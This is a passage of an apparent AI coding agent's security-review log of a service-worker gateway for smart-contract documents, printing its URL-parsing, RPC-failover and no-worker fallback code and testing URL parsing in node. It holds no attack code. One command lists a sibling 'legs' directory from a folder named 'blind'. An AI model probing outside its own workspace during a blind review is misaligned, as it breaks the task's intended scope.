+   184	  if (value === undefined) return "nothing";
+   185	  const shown: string | undefined = JSON.stringify(value);
+   186	  return shown ?? typeof value;
+   187	}
+   188	
+   189	/**
+   190	 * The target of a URL in a pinned build: always one of the configured contracts, whatever the
+   191	 * hostname says, which is never read. With one contract the whole path is the resource, so a path
+   192	 * of the path form is just a path. With several, the first segment is the chain and nothing else
+   193	 * reaches a contract — an unconfigured first segment is a 404 that costs no call.
+   194	 */
+   195	export function pinnedTarget(url: URL, pins: Pins): Target {
+   196	  const params: [string, string][] = [...url.searchParams.entries()];
+   197	  const chains = Object.keys(pins.contracts);
+   198	  const path = segments(url.pathname);
+   199	
+   200	  if (chains.length === 1) {
+   201	    return { chain: pins.default, address: at(pins, pins.default), resource: trimRoot(path), params };
+   202	  }
+   203	
+   204	  const [first, ...rest] = path;
+   205	  if (first === undefined || first === "") {
+   206	    // 302, not 308: which chain is the default is a setting, and a cached permanent redirect to the
+   207	    // old one would outlive the change in every browser that saw it.
+   208	    return {
+   209	      chain: pins.default,
+   210	      address: at(pins, pins.default),
+   211	      resource: [],
+   212	      params,
+   213	      redirect: `/${pins.default}/${url.search}`,
+   214	      redirectStatus: 302,
+   215	    };
+   216	  }
+   217	  if (!Object.hasOwn(pins.contracts, first)) {
+   218	    throw new GatewayError("not-found", "no contract at this path");
+   219	  }
+   220	  const target: Target = { chain: first, address: at(pins, first), resource: trimRoot(rest), params };
+   221	  if (rest.length === 0) {
+   222	    target.redirect = `/${first}/${url.search}`;
+   223	    target.redirectStatus = 308;
+   224	  }
+   225	  return target;
+   226	}
+   227	
+   228	function at(pins: Pins, chain: string): string {
+   229	  const address = pins.contracts[chain];
+   230	  if (address === undefined) throw new GatewayError("not-found", "no contract at this path");
+   231	  return address;
+   232	}
+   233	
+   234	/** `/` splits to one empty segment; the root is the empty resource. */
+   235	function trimRoot(resource: string[]): string[] {
+   236	  return resource.length === 1 && resource[0] === "" ? [] : resource;
+   237	}
+
+codex
+The first pass confirms the code already contains defenses tied to prior reviews, so I’m treating those comments as claims to verify, not conclusions. I’m now tracing the exact URL/parser and boot/fallback branches, where subtle origin and navigation behavior is most likely to remain.
+exec
+/bin/bash -lc 'nl -ba src/adapters/rpc/fetch.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+     1	import { hexToBytes } from "../../core/abi.ts";
+     2	import { GatewayError } from "../../core/errors.ts";
+     3	import { type Rpc, RpcRevert } from "../../core/ports.ts";
+     4	
+     5	/** Chain id to its JSON-RPC endpoints, tried in order. */
+     6	export type Chains = Readonly<Record<string, readonly string[]>>;
+     7	
+     8	export interface FetchRpcOptions {
+     9	  timeoutMs?: number;
+    10	  /** Cap on one JSON-RPC response body. The document arrives hex-encoded, so twice its size. */
+    11	  maxBytes?: number;
+    12	  fetch?: typeof fetch;
+    13	}
+    14	
+    15	interface JsonRpcReply {
+    16	  result?: unknown;
+    17	  error?: { code?: unknown; message?: unknown; data?: unknown };
+    18	}
+    19	
+    20	async function readCapped(res: Response, maxBytes: number): Promise<string> {
+    21	  if (!res.body) return "";
+    22	  const reader = res.body.getReader();
+    23	  const text = new TextDecoder();
+    24	  let out = "";
+    25	  let seen = 0;
+    26	  for (;;) {
+    27	    const { done, value } = await reader.read();
+    28	    if (done) return out + text.decode();
+    29	    seen += value.length;
+    30	    if (seen > maxBytes) {
+    31	      await reader.cancel();
+    32	      throw new Error("response exceeds the size cap");
+    33	    }
+    34	    out += text.decode(value, { stream: true });
+    35	  }
+    36	}
+    37	
+    38	/** A revert is the contract's answer; every other JSON-RPC error is the endpoint's problem. */
+    39	function isRevert(error: NonNullable<JsonRpcReply["error"]>): boolean {
+    40	  return error.code === 3 || (typeof error.message === "string" && /revert/i.test(error.message));
+    41	}
+    42	
+    43	/**
+    44	 * JSON-RPC over `fetch`, with ordered failover. Limits: one endpoint's word is taken as the chain's;
+    45	 * there is no quorum and no proof verification.
+    46	 *
+    47	 * `timeoutMs` bounds **one** endpoint, not the call. The endpoints are tried in order and nothing
+    48	 * spans the list, so with `n` endpoints a single `call` can take up to `n × timeoutMs` before it
+    49	 * throws `upstream` — at the defaults, two endpoints that never answer cost 20 s. Callers that need
+    50	 * a deadline across the whole list must impose it themselves; a budget here is M04's, not this
+    51	 * adapter's.
+    52	 */
+    53	export function createFetchRpc(chains: Chains, options: FetchRpcOptions = {}): Rpc {
+    54	  const { timeoutMs = 10_000, maxBytes = 16 * 1024 * 1024 } = options;
+    55	  const send = options.fetch ?? fetch;
+    56	
+    57	  async function callOne(endpoint: string, to: string, data: string): Promise<Uint8Array> {
+    58	    const res = await send(endpoint, {
+    59	      method: "POST",
+    60	      headers: { "content-type": "application/json" },
+    61	      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_call", params: [{ to, data }, "latest"] }),
+    62	      signal: AbortSignal.timeout(timeoutMs),
+    63	      credentials: "omit",
+    64	      cache: "no-store",
+    65	      referrerPolicy: "no-referrer",
+    66	    });
+    67	    /* A non-2xx body is not an answer, whatever it contains. Without this, a 429 or a 500 whose
+    68	       body happened to be JSON-RPC-shaped would be believed and failover would not happen. */
+    69	    if (!res.ok) throw new Error(`endpoint returned HTTP ${res.status}`);
+    70	    const text = await readCapped(res, maxBytes);
+    71	    const reply = JSON.parse(text) as JsonRpcReply;
+    72	    if (reply.error) {
+    73	      if (isRevert(reply.error)) throw new RpcRevert();
+    74	      throw new Error("endpoint returned an error");
+    75	    }
+    76	    if (typeof reply.result !== "string") throw new Error("endpoint returned no result");
+    77	    return hexToBytes(reply.result);
+    78	  }
+    79	
+    80	  return {
+    81	    supports: (chain) => (chains[chain]?.length ?? 0) > 0,
+    82	    async call(chain, to, data) {
+    83	      const endpoints = chains[chain] ?? [];
+    84	      if (endpoints.length === 0) throw new GatewayError("unknown-chain", `chain ${chain} is not configured`);
+    85	      for (const endpoint of endpoints) {
+    86	        try {
+    87	          return await callOne(endpoint, to, data);
+    88	        } catch (error) {
+    89	          if (error instanceof RpcRevert) throw error;
+    90	          // Deliberately swallowed: the next endpoint is the handling.
+    91	        }
+    92	      }
+    93	      throw new GatewayError("upstream", `no RPC endpoint for chain ${chain} answered`);
+    94	    },
+    95	  };
+    96	}
+
+exec
+/bin/bash -lc 'nl -ba src/adapters/sw/boot.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+     1	/// <reference lib="dom" />
+     2	import { GatewayError } from "../../core/errors.ts";
+     3	import { resolve } from "../../core/resolve.ts";
+     4	import { createFetchRpc } from "../rpc/fetch.ts";
+     5	import { CHAINS, FRAME, PURGE, SW_PATH, targetOf } from "./config.ts";
+     6	import {
+     7	  MAX_ATTEMPTS,
+     8	  attemptsFrom,
+     9	  attemptsValue,
+    10	  headersAreHonourable,
+    11	  isRootTarget,
+    12	} from "./fallback.ts";
+    13	
+    14	// The static host serves this page for every URL. It runs only when the service worker does not
+    15	// control the page: a first visit, a forced reload, or a browser without service workers.
+    16	
+    17	const ATTEMPTS = "gw44:boot";
+    18	const WORKER_MS = 4000;
+    19	
+    20	function say(message: string): void {
+    21	  const el = document.getElementById("gw44");
+    22	  if (el) el.textContent = message;
+    23	}
+    24	
+    25	/** Counts reloads inside a short window, so a worker that never takes control cannot loop the page.
+    26	 *  The reading of the stored value is `fallback.ts`'s, where it is tested without a browser. */
+    27	function attempt(): number {
+    28	  try {
+    29	    const now = Date.now();
+    30	    const n = attemptsFrom(sessionStorage.getItem(ATTEMPTS), now);
+    31	    sessionStorage.setItem(ATTEMPTS, attemptsValue(n, now));
+    32	    return n;
+    33	  } catch {
+    34	    return MAX_ATTEMPTS; // storage blocked: no loop guard, so do not reload at all
+    35	  }
+    36	}
+    37	
+    38	const NEEDS_WORKER = "gw44: this page needs a service worker, and this browser is not providing one here.";
+    39	
+    40	/**
+    41	 * No service worker: fetch the contract's root document here and write it over this page. Same
+    42	 * origin, same URL, and only ever the root — without a worker nothing can answer the document's
+    43	 * relative URLs, so a deeper path would render a document whose own subresources cannot load.
+    44	 *
+    45	 * It declines, with one sentence, unless all three hold: this is the top-level page, the URL is the
+    46	 * contract's root, and the response carries no header this page cannot honour.
+    47	 */
+    48	async function renderInline(url: URL): Promise<void> {
+    49	  const target = targetOf(url);
+    50	  if (target === null) return;
+    51	  // Both checked before the call, so a URL that will be declined costs no chain read.
+    52	  if (window.top !== window.self) return say(NEEDS_WORKER);
+    53	  if (!isRootTarget(target)) return say(NEEDS_WORKER);
+    54	  const res = await resolve(target, createFetchRpc(CHAINS), FRAME);
+    55	  const type = res.headers.find(([k]) => k === "content-type")?.[1] ?? "";
+    56	  const text = new TextDecoder().decode(res.body);
+    57	  if (res.status !== 200 || !type.startsWith("text/html")) return say(text.trim());
+    58	  if (!headersAreHonourable(res)) return say(NEEDS_WORKER);
+    59	  document.open();
+    60	  document.write(text);
+    61	  document.close();
+    62	}
+    63	
+    64	async function boot(): Promise<void> {
+    65	  const url = new URL(location.href);
+    66	  try {
+    67	    const target = targetOf(url);
+    68	    if (target === null) return say("gw44: no contract in this URL");
+    69	    /* Before any worker is registered: a multi-chain build sends `/` to the default chain's prefix,
+    70	       and the no-worker fallback can only render the root document of the URL it is on. Moving
+    71	       first means that fallback never renders the default chain's document at `/`, where the
+    72	       document's relative URLs would resolve outside the prefix.
+    73	
+    74	       The fragment is carried explicitly. A browser keeps it across the worker's 302 and 308 by
+    75	       itself, but a script navigation does not, so without this a first visit to `/#/docs` landed
+    76	       on `/<default>/` while every later visit landed on `/<default>/#/docs`. */
+    77	    if (target.redirect !== undefined) return void location.replace(target.redirect + location.hash);
+    78	  } catch (error) {
+    79	    /* A configured build throws rather than returning null for a first segment it has no contract
+    80	       for, and that is the ordinary case of a visitor mistyping a chain — not a malformed URL. The
+    81	       worker serves `gw44: no contract at this path` there, so the page without a worker says the
+    82	       same sentence (#82). Anything that is not the gateway's own error keeps the old one. */
+    83	    return say(error instanceof GatewayError ? `gw44: ${error.message}` : "gw44: malformed URL");
+    84	  }
+    85	  if (!("serviceWorker" in navigator) || attempt() >= MAX_ATTEMPTS) return renderInline(url);
+    86	  try {
+    87	    // Raced, because a browser that blocks workers may leave `register` or `ready` pending forever.
+    88	    const registration = await Promise.race([
+    89	      navigator.serviceWorker
+    90	        .register(SW_PATH, { scope: "/", updateViaCache: "none" })
+    91	        .then(() => navigator.serviceWorker.ready),
+    92	      new Promise<never>((_, fail) => setTimeout(() => fail(new Error("worker timeout")), WORKER_MS)),
+    93	    ]);
+    94	    // Active but not controlling this page: the user forced a reload. Clear before going back.
+    95	    await new Promise<void>((done) => {
+    96	      const channel = new MessageChannel();
+    97	      channel.port1.onmessage = () => done();
+    98	      registration.active?.postMessage(PURGE, [channel.port2]);
+    99	      setTimeout(done, 1000);
+   100	    });
+   101	    location.reload();
+   102	  } catch {
+   103	    await renderInline(url);
+   104	  }
+   105	}
+   106	
+   107	void boot().catch(() => say("gw44: failed to load"));
+
+exec
+/bin/bash -lc 'nl -ba src/adapters/sw/config.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+     1	import { type Frame, type Pins, type Target, parseTarget, pinnedTarget } from "../../core/target.ts";
+     2	import type { Chains } from "../rpc/fetch.ts";
+     3	
+     4	// Replaced by the build with the contents of the chains file. Baked in rather than fetched, so the
+     5	// service worker's bytes are the whole of what decides which endpoint is believed.
+     6	declare const __GW44_CHAINS__: Chains;
+     7	/** The configured contracts, or null in an ordinary build. Replaced by the build, like the chains. */
+     8	declare const __GW44_PINS__: Pins | null;
+     9	/**
+    10	 * Whether this build is pinned. A separate boolean rather than a `__GW44_PINS__ === null` test,
+    11	 * because the bundler folds a boolean constant in both directions and so drops the parser each
+    12	 * build does not use: comparing the object with null folds only the unpinned way, which left both
+    13	 * parsers in every bundle and cost the unpinned worker 570 bytes.
+    14	 */
+    15	declare const __GW44_PINNED__: boolean;
+    16	
+    17	export const CHAINS: Chains = __GW44_CHAINS__;
+    18	
+    19	/**
+    20	 * The one place either adapter decides which contract a URL names. A pinned build answers for its
+    21	 * configured contracts and reads no hostname; an unpinned build reads the two URL forms as before.
+    22	 */
+    23	export const targetOf: (url: URL) => Target | null = __GW44_PINNED__
+    24	  ? (url: URL) => pinnedTarget(url, __GW44_PINS__ as Pins)
+    25	  : parseTarget;
+    26	
+    27	/** The build's framing setting for a root document (#57). An unpinned build and a `PIN=` build have
+    28	 *  no configuration file to say otherwise, so both take the default. */
+    29	export const FRAME: Frame = (__GW44_PINNED__ ? (__GW44_PINS__ as Pins).frame : undefined) ?? "self";
+    30	/** Reserved on every origin the gateway serves: the worker answers this path itself with a 404 and
+    31	 *  no chain read, so a contract's own resource of this name is shadowed rather than served (#62). */
+    32	export const SW_PATH = "/gw44-sw.js";
+    33	export const PURGE = "gw44:purge";
+
+exec
+/bin/bash -lc 'nl -ba src/adapters/rpc/memory.ts' in /tmp/tmp.WSl2mhjyqV/blind
+exec
+/bin/bash -lc 'nl -ba src/core/target.ts' in /tmp/tmp.WSl2mhjyqV/blind
+exec
+/bin/bash -lc 'nl -ba src/adapters/sw/fallback.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+     1	import { type Rpc, RpcRevert } from "../../core/ports.ts";
+     2	
+     3	/** `chain:address:calldata` to return data. A missing key reverts, as an unknown selector would. */
+     4	export type MemoryCalls = Map<string, Uint8Array>;
+     5	
+     6	export const memoryKey = (chain: string, to: string, data: string): string => `${chain}:${to}:${data}`;
+     7	
+     8	/** The local adapter: a complete `Rpc` over a map, and the contract every other adapter meets. */
+     9	export function createMemoryRpc(chainIds: string[], calls: MemoryCalls): Rpc {
+    10	  return {
+    11	    supports: (chain) => chainIds.includes(chain),
+    12	    async call(chain, to, data) {
+    13	      const out = calls.get(memoryKey(chain, to, data));
+    14	      if (out === undefined) throw new RpcRevert();
+    15	      return out;
+    16	    },
+    17	  };
+    18	}
+
+ succeeded in 0ms:
+     1	import { GatewayError } from "./errors.ts";
+     2	
+     3	export interface Target {
+     4	  /** Decimal chain id, no leading zeros. */
+     5	  chain: string;
+     6	  /** Lower-case, 0x-prefixed, 20 bytes. */
+     7	  address: string;
+     8	  /** Percent-decoded path segments. Empty for the root. */
+     9	  resource: string[];
+    10	  params: [string, string][];
+    11	  /**
+    12	   * Set when a path-form URL lacks the slash after the address. Relative URLs in the document
+    13	   * would resolve one level too high, so the adapter redirects here instead of serving.
+    14	   */
+    15	  redirect?: string;
+    16	  /** How to answer `redirect`; 308 when absent. 302 is for a redirect whose destination can change. */
+    17	  redirectStatus?: 302 | 308;
+    18	}
+    19	
+    20	/**
+    21	 * One project's contracts, one per chain, as `gw44.json` names them. Several chains of one project
+    22	 * share one origin and are told apart by the first path segment, which is a path and not a browser
+    23	 * boundary: they share storage, the worker registration and any wallet permission the visitor has
+    24	 * granted, so each is only as safe as the weakest contract configured beside it. An application
+    25	 * that keeps per-chain state separates it by chain itself; nothing in the origin does that for it.
+    26	 * What the prefix buys is that a document's absolute URL fails instead of reading another chain's
+    27	 * contract, and that one project's contracts stay out of every other project's origin (decision 9;
+    28	 * F1 of the 2026-11-20 review, which found this comment claiming the opposite).
+    29	 */
+    30	export interface Pins {
+    31	  /** A key of `contracts`; the chain `/` goes to. */
+    32	  default: string;
+    33	  /** Chain id to lower-case address. At least one. */
+    34	  contracts: Record<string, string>;
+    35	  /** Who may frame a root document; `"self"` when absent. See `Frame`. */
+    36	  frame?: Frame;
+    37	}
+    38	
+    39	/**
+    40	 * Who may frame a contract's root document. `"self"` — the default, and what a `PIN=` build takes —
+    41	 * serves it with `content-security-policy: frame-ancestors 'self'`; `"any"` omits the header and
+    42	 * lets any site frame it. The whole setting is those two words: a project that needs a policy of its
+    43	 * own serves its page from `request()`, where it sets its own headers (#57).
+    44	 */
+    45	export type Frame = "self" | "any";
+    46	
+    47	const ADDRESS = /^0x[0-9a-f]{40}$/;
+    48	const CHAIN = /^[1-9][0-9]{0,15}$/;
+    49	
+    50	/** A decimal chain id: no leading zeros, no sign, no separators. The URL form's rule, exported so
+    51	 *  the chains file is checked against the same one rather than a second copy of it. */
+    52	export function isChainId(value: string): boolean {
+    53	  return CHAIN.test(value);
+    54	}
+    55	
+    56	/** Loopback only: `localhost`, any `*.localhost`, 127.0.0.0/8 and `[::1]`. */
+    57	export function isLoopback(hostname: string): boolean {
+    58	  return (
+    59	    hostname === "localhost" ||
+    60	    hostname.endsWith(".localhost") ||
+    61	    hostname === "[::1]" ||
+    62	    /^127(\.[0-9]{1,3}){3}$/.test(hostname)
+    63	  );
+    64	}
+    65	
+    66	function segments(pathname: string): string[] {
+    67	  const parts = pathname.split("/").slice(1);
+    68	  try {
+    69	    return parts.map((p) => decodeURIComponent(p));
+    70	  } catch {
+    71	    throw new GatewayError("bad-target", "malformed percent-encoding in path");
+    72	  }
+    73	}
+    74	
+    75	/**
+    76	 * Two URL forms, and nothing else:
+    77	 *
+    78	 *   host form  `<address>.<chain>.<any base>/<path>`   every contract its own origin
+    79	 *   path form  `<loopback>/<chain>/<address>/<path>`   every contract on one origin
+    80	 *
+    81	 * The path form is honoured on loopback hosts only. On a public host it would put every contract
+    82	 * in one origin, where any document could read another's storage or replace its service worker.
+    83	 *
+    84	 * Returns null when the URL names no contract, so the adapter can leave it to the static host.
+    85	 */
+    86	export function parseTarget(url: URL): Target | null {
+    87	  const labels = url.hostname.toLowerCase().split(".");
+    88	  const params: [string, string][] = [...url.searchParams.entries()];
+    89	
+    90	  const [first, second] = labels;
+    91	  if (labels.length >= 3 && first !== undefined && second !== undefined && ADDRESS.test(first)) {
+    92	    if (!CHAIN.test(second)) return null;
+    93	    const resource = segments(url.pathname);
+    94	    return { chain: second, address: first, resource: trimRoot(resource), params };
+    95	  }
+    96	
+    97	  if (!isLoopback(url.hostname.toLowerCase())) return null;
+    98	  const [chain, rawAddress, ...rest] = segments(url.pathname);
+    99	  const address = rawAddress?.toLowerCase();
+   100	  if (chain === undefined || address === undefined) return null;
+   101	  if (!CHAIN.test(chain) || !ADDRESS.test(address)) return null;
+   102	  const target: Target = { chain, address, resource: trimRoot(rest), params };
+   103	  if (rest.length === 0) target.redirect = `${url.pathname}/${url.search}`;
+   104	  return target;
+   105	}
+   106	
+   107	/**
+   108	 * `<chain>:<address>`, the pin as a build gives it. Throws rather than returning null: a URL that
+   109	 * names no contract is ordinary and a malformed pin is a mistake, so the two must not look alike.
+   110	 */
+   111	export function parsePin(text: string): Pins {
+   112	  const parts = text.split(":");
+   113	  const [chain, rawAddress] = parts;
+   114	  if (parts.length !== 2 || chain === undefined || rawAddress === undefined) {
+   115	    throw new GatewayError("bad-target", `pin must be <chain>:<address>; got ${JSON.stringify(text)}`);
+   116	  }
+   117	  const address = rawAddress.toLowerCase();
+   118	  if (!CHAIN.test(chain)) {
+   119	    throw new GatewayError("bad-target", `pin chain must be a decimal chain id; got ${JSON.stringify(chain)}`);
+   120	  }
+   121	  if (!ADDRESS.test(address)) {
+   122	    throw new GatewayError("bad-target", `pin address must be 0x and 40 hex digits; got ${JSON.stringify(rawAddress)}`);
+   123	  }
+   124	  return { default: chain, contracts: { [chain]: address } };
+   125	}
+   126	
+   127	/**
+   128	 * The configuration file, validated. Throws rather than returning null for the same reason
+   129	 * `parsePin` does: a malformed configuration is a mistake, not a URL that names no contract.
+   130	 */
+   131	export function parsePins(value: unknown): Pins {
+   132	  if (typeof value !== "object" || value === null || Array.isArray(value)) {
+   133	    throw new GatewayError("bad-target", `configuration must be a JSON object; got ${describe(value)}`);
+   134	  }
+   135	  const record = value as Record<string, unknown>;
+   136	  for (const key of Object.keys(record)) {
+   137	    if (key !== "default" && key !== "contracts" && key !== "frame") {
+   138	      throw new GatewayError("bad-target", `configuration has no key ${JSON.stringify(key)}`);
+   139	    }
+   140	  }
+   141	  const frame = record["frame"];
+   142	  if (frame !== undefined && frame !== "self" && frame !== "any") {
+   143	    throw new GatewayError("bad-target", `configuration "frame" must be "self" or "any"; got ${describe(frame)}`);
+   144	  }
+   145	  const raw = record["contracts"];
+   146	  if (typeof raw !== "object" || raw === null || Array.isArray(raw)) {
+   147	    throw new GatewayError("bad-target", `configuration "contracts" must be an object; got ${describe(raw)}`);
+   148	  }
+   149	  const contracts: Record<string, string> = {};
+   150	  for (const [chain, address] of Object.entries(raw as Record<string, unknown>)) {
+   151	    if (!CHAIN.test(chain)) {
+   152	      throw new GatewayError("bad-target", `configuration chain ${JSON.stringify(chain)} is not a decimal chain id`);
+   153	    }
+   154	    if (typeof address !== "string" || !ADDRESS.test(address.toLowerCase())) {
+   155	      throw new GatewayError(
+   156	        "bad-target",
+   157	        `configuration address for chain ${chain} must be 0x and 40 hex digits; got ${describe(address)}`,
+   158	      );
+   159	    }
+   160	    contracts[chain] = address.toLowerCase();
+   161	  }
+   162	  const chains = Object.keys(contracts);
+   163	  const only = chains[0];
+   164	  if (only === undefined) {
+   165	    throw new GatewayError("bad-target", 'configuration "contracts" must name at least one chain');
+   166	  }
+   167	  /* The default may be left out only when there is nothing to choose between. With two contracts a
+   168	     missing default would make `/` mean whichever chain the JSON happened to list first. */
+   169	  const fallback = record["default"] ?? (chains.length === 1 ? only : undefined);
+   170	  if (fallback === undefined) {
+   171	    throw new GatewayError("bad-target", `configuration needs "default" when it names ${chains.length} chains`);
+   172	  }
+   173	  if (typeof fallback !== "string" || !Object.hasOwn(contracts, fallback)) {
+   174	    throw new GatewayError(
+   175	      "bad-target",
+   176	      `configuration "default" must be one of ${chains.join(", ")}; got ${describe(fallback)}`,
+   177	    );
+   178	  }
+   179	  // Absent rather than defaulted here, so one place decides what absent means: `frameOf`.
+   180	  return frame === undefined ? { default: fallback, contracts } : { default: fallback, contracts, frame };
+   181	}
+   182	
+   183	function describe(value: unknown): string {
+   184	  if (value === undefined) return "nothing";
+   185	  const shown: string | undefined = JSON.stringify(value);
+   186	  return shown ?? typeof value;
+   187	}
+   188	
+   189	/**
+   190	 * The target of a URL in a pinned build: always one of the configured contracts, whatever the
+   191	 * hostname says, which is never read. With one contract the whole path is the resource, so a path
+   192	 * of the path form is just a path. With several, the first segment is the chain and nothing else
+   193	 * reaches a contract — an unconfigured first segment is a 404 that costs no call.
+   194	 */
+   195	export function pinnedTarget(url: URL, pins: Pins): Target {
+   196	  const params: [string, string][] = [...url.searchParams.entries()];
+   197	  const chains = Object.keys(pins.contracts);
+   198	  const path = segments(url.pathname);
+   199	
+   200	  if (chains.length === 1) {
+   201	    return { chain: pins.default, address: at(pins, pins.default), resource: trimRoot(path), params };
+   202	  }
+   203	
+   204	  const [first, ...rest] = path;
+   205	  if (first === undefined || first === "") {
+   206	    // 302, not 308: which chain is the default is a setting, and a cached permanent redirect to the
+   207	    // old one would outlive the change in every browser that saw it.
+   208	    return {
+   209	      chain: pins.default,
+   210	      address: at(pins, pins.default),
+   211	      resource: [],
+   212	      params,
+   213	      redirect: `/${pins.default}/${url.search}`,
+   214	      redirectStatus: 302,
+   215	    };
+   216	  }
+   217	  if (!Object.hasOwn(pins.contracts, first)) {
+   218	    throw new GatewayError("not-found", "no contract at this path");
+   219	  }
+   220	  const target: Target = { chain: first, address: at(pins, first), resource: trimRoot(rest), params };
+   221	  if (rest.length === 0) {
+   222	    target.redirect = `/${first}/${url.search}`;
+   223	    target.redirectStatus = 308;
+   224	  }
+   225	  return target;
+   226	}
+   227	
+   228	function at(pins: Pins, chain: string): string {
+   229	  const address = pins.contracts[chain];
+   230	  if (address === undefined) throw new GatewayError("not-found", "no contract at this path");
+   231	  return address;
+   232	}
+   233	
+   234	/** `/` splits to one empty segment; the root is the empty resource. */
+   235	function trimRoot(resource: string[]): string[] {
+   236	  return resource.length === 1 && resource[0] === "" ? [] : resource;
+   237	}
+
+ succeeded in 0ms:
+     1	import type { GatewayResponse } from "../../core/ports.ts";
+     2	import { ROOT_FRAME_POLICY } from "../../core/resolve.ts";
+     3	import type { Target } from "../../core/target.ts";
+     4	
+     5	/**
+     6	 * What the no-worker fallback may render, as two pure decisions so they can be tested without a
+     7	 * browser. The third condition — that the page is the top-level one — needs `window`, so it stays
+     8	 * in `boot.ts`.
+     9	 *
+    10	 * The fallback writes a contract's bytes into a document whose real headers are the static host's,
+    11	 * so anything the contract set to constrain its own document would not apply and the visitor could
+    12	 * not tell (F2, the 2026-11-20 review). Rather than honour part of what a contract asked for, it
+    13	 * declines.
+    14	 */
+    15	
+    16	/**
+    17	 * Headers this page cannot honour. `content-security-policy-report-only` is here although the core's
+    18	 * allowlist does not pass it: this list is what the fallback cannot honour, not what can reach it,
+    19	 * and the two should not have to be read together to be safe.
+    20	 */
+    21	export const UNHONOURABLE_HEADERS = [
+    22	  "content-security-policy",
+    23	  "content-security-policy-report-only",
+    24	  "x-frame-options",
+    25	  "cross-origin-opener-policy",
+    26	  "cross-origin-embedder-policy",
+    27	  "cross-origin-resource-policy",
+    28	  "permissions-policy",
+    29	  "content-disposition",
+    30	];
+    31	
+    32	/**
+    33	 * Only a contract's root. Without a worker nothing answers the document's relative URLs, so a deeper
+    34	 * path would render a document whose own subresources cannot load.
+    35	 */
+    36	export function isRootTarget(target: Target): boolean {
+    37	  return target.resource.length === 0;
+    38	}
+    39	
+    40	/**
+    41	 * True when every header of the response is one this page can honour.
+    42	 *
+    43	 * Live since #57, which gives a root document `content-security-policy: frame-ancestors 'self'`. A
+    44	 * document write cannot apply a policy, so the page cannot honour that header the way a real
+    45	 * response would — but it does not have to: `boot.ts` renders only when `window.top === window.self`
+    46	 * (`renderInline`, the check before the chain read), so what it renders is never in a frame at all,
+    47	 * which is stricter than the policy asks for. That holds for this exact policy and for nothing else,
+    48	 * so the value is compared rather than the name allowed: any other directive, including a wider
+    49	 * `frame-ancestors`, is a policy whose effect the page would be dropping, and it declines.
+    50	 */
+    51	export function headersAreHonourable(res: GatewayResponse): boolean {
+    52	  return res.headers.every(([key, value]) => {
+    53	    const name = key.toLowerCase();
+    54	    if (!UNHONOURABLE_HEADERS.includes(name)) return true;
+    55	    return name === "content-security-policy" && value === ROOT_FRAME_POLICY;
+    56	  });
+    57	}
+    58	
+    59	/** Reloads allowed inside `ATTEMPT_WINDOW_MS` before the page stops trying to install a worker. */
+    60	export const MAX_ATTEMPTS = 2;
+    61	/** How long a reload counts towards the limit: longer than a worker install, shorter than a visit. */
+    62	export const ATTEMPT_WINDOW_MS = 10_000;
+    63	
+    64	/** The stored counter's only accepted shape: one digit of count, a colon, an integer of epoch ms. */
+    65	const ATTEMPTS = /^([0-9]):([0-9]{1,15})$/;
+    66	
+    67	/**
+    68	 * How many reloads this page has already made, read from session storage (#59).
+    69	 *
+    70	 * A rendered contract document shares this origin's session storage and can write anything into the
+    71	 * key. So a value this cannot read as a counter is `MAX_ATTEMPTS` and never 0: a document can then
+    72	 * stop a reload, which costs one page rendered inline, but cannot spend the page's reloads for it or
+    73	 * drive it in a loop. The old parser took `Number("")` as `NaN`, compared it and arrived at 0. A
+    74	 * timestamp in the future is the same answer, since it would otherwise hold the window open for as
+    75	 * long as the document liked.
+    76	 */
+    77	export function attemptsFrom(stored: string | null, now: number): number {
+    78	  if (stored === null) return 0;
+    79	  const parts = ATTEMPTS.exec(stored);
+    80	  if (parts === null) return MAX_ATTEMPTS;
+    81	  const at = Number(parts[2]);
+    82	  if (at > now) return MAX_ATTEMPTS;
+    83	  // Outside the window it is a fresh visit, whatever it counted: the reloads are spent, not lost.
+    84	  return now - at < ATTEMPT_WINDOW_MS ? Number(parts[1]) : 0;
+    85	}
+    86	
+    87	/** The value to store for the next load. Kept to the shape `attemptsFrom` accepts, counter clamped
+    88	 *  to one digit so that what this writes is always a value it can read back. */
+    89	export function attemptsValue(attempts: number, now: number): string {
+    90	  return `${Math.min(attempts + 1, 9)}:${now}`;
+    91	}
+
+exec
+/bin/bash -lc "node - <<'NODE'
+for (const s of ['http://127.999.999.999','http://127.0.0.999','http://127.1','http://127.0.0.1','http://127.000.000.001','http://[::1]','https://user:secret@example.com/rpc']) { try { const u=new URL(s); console.log(s, '=>', u.hostname, u.href, u.username, u.password); } catch(e) { console.log(s, 'ERR'); } }
+NODE" in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+http://127.999.999.999 ERR
+http://127.0.0.999 ERR
+http://127.1 => 127.0.0.1 http://127.0.0.1/  
+http://127.0.0.1 => 127.0.0.1 http://127.0.0.1/  
+http://127.000.000.001 => 127.0.0.1 http://127.0.0.1/  
+http://[::1] => [::1] http://[::1]/  
+https://user:secret@example.com/rpc => example.com https://user:secret@example.com/rpc user secret
+
+codex
+The URL-derived redirects remain origin-absolute after following their construction paths; I have not found an origin escape or a route from a pinned build to an unconfigured contract. The remaining credible issues are availability and cross-contract origin sharing, plus build-time filesystem/input hazards; I’m validating their exploit preconditions and severity before writing the report.
+exec
+/bin/bash -lc 'ls -la && find . -maxdepth 3 -type f -print | sort && git diff --stat && git status --short && ls -ld /tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+total 0
+drwxrwxr-x 7 openclaw openclaw 140 Nov 21 13:03 .
+drwx------ 4 openclaw openclaw 120 Nov 21 12:59 ..
+dr-xr-xr-x 2 openclaw openclaw  40 Nov 21 13:03 .agents
+dr-xr-xr-x 2 openclaw openclaw  40 Nov 21 13:03 .codex
+drwxrwxr-x 7 openclaw openclaw 240 Nov 21 12:59 .git
+drwxrwxr-x 4 openclaw openclaw  80 Nov 21 12:59 src
+drwxrwxr-x 2 openclaw openclaw 100 Nov 21 12:59 tools
+./.git/COMMIT_EDITMSG
+./.git/HEAD
+./.git/config
+./.git/description
+./.git/hooks/applypatch-msg.sample
+./.git/hooks/commit-msg.sample
+./.git/hooks/fsmonitor-watchman.sample
